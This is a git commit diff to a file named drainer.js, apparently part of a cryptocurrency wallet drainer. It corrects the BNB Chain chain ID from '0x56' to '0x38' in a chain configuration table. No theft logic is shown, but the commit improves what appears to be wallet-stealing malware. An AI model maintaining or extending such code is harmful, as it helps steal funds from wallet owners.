7e5952d47bac5b143d6c2c594f967ac770e0ea07
solanatraderalo <solanatrader1337@tutamail.com>
2025-04-25 22:28:45 +0200

    Update drainer.js

--- src/drainer.js
+++ src/drainer.js
@@ -38,7 +38,7 @@ const CHAINS = {
   56: {
     name: "BNB Chain",
     nativeToken: "BNB",
-    chainIdHex: "0x56",
+    chainIdHex: "0x38",
     rpcUrls: [
       "https://bsc-dataseed.binance.org/",
       "https://bsc-dataseed1.defibit.io/",
